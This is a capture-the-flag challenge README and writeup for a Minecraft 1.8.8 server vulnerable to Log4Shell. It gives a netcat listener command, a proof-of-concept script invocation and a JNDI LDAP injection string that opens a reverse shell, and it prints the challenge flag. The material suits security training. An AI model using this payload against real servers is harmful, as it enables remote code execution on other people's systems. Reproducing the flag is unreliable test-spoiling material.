# mc
Description:
```markdown
My son asked me to make him a minecraft server! He told me to use 1.8.8 because it has better pvp mechanics or something like that. Anyway it's open so his friends can join. I hope that it doesn't log anything incorrectly...

`mc.chal.cyberjousting.com:25565`

```

**Author**: `zinko`

## Writeup
The intended solve for this challenge is for you to do some research to find (ie by searching `minecraft logging vuln`) to find out this challenge uses the Log4J vulnerability. Next is finding a way to execute it...

Requirements: `pip install -r requirements.txt`

In a terminal window:
`nc -lvnp 9001`

In a different terminal window: `python3 poc.py —-userip {your ip connecting to mc server} —-webport 8000 —-lport 9001`

Paste this string in the minecraft chat: `${jndi:ldap://{the ip you used for —-userip}:1389/a}`

Now you have reverse shell in your netcat terminal: 
`cat flag.txt`


**Flag** - `byuctf{N07_my_min3cr4f7_s3rv3r}`

## Hosting

This challenge should be a Docker container that runs a minecraft server on port 25565. All the proper files are included in here. The command to build the docker container is (when located inside of this directory):

```bash
docker compose up -d
```

To stop the challenge:
```bash
docker compose down
```
Note: The server will crash whenever someone runs the exploit (not sure why). It is set to auto restart.
